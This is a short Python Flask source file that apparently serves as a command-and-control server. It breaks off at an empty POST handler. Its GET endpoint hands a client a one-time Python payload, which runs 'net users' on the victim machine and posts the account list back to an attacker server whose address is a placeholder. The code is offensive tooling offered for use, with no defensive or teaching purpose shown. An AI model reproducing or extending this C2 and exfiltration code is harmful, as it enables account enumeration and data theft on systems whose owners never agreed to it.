import os
import hashlib
import requests
from flask import request
from flask import Flask, jsonify

# Directory where the server's assets are stored
ASSETS_DIR = os.path.dirname(os.path.abspath(__file__))

# Create a Flask app
app = Flask(__name__)

# Flag to track whether the command has been executed
ran = False

@app.route('/', methods=['GET'])
def main_get():
    """Endpoint for handling GET requests."""
    global ran

    # Return an empty response if the command has already been executed
    if ran:
        return jsonify({})

    # Construct the command to be executed by the client
    command = """
    import requests
    import os

    # Replace these with the actual server address and port
    server_address = '<YOUR_SERVER_IP_HERE>'
    server_port = '<YOUR_SERVER_PORT_HERE>'

    # Construct the full URL for the server
    url = f'https://{server_address}:{server_port}/'

    # Execute the 'net users' command and store the output
    stream = os.popen('net users')
    output = stream.read()

    # Send the output back to the server
    data = {'result': output}
    requests.post(url, json=data)
    """

    # Set the flag to indicate that the command has been executed
    ran = True

    # Return the command in the response
    return jsonify({'command': command})

@app.route('/', methods=['POST'])
def main_post():
    """Endpoint for handling POST requests."""
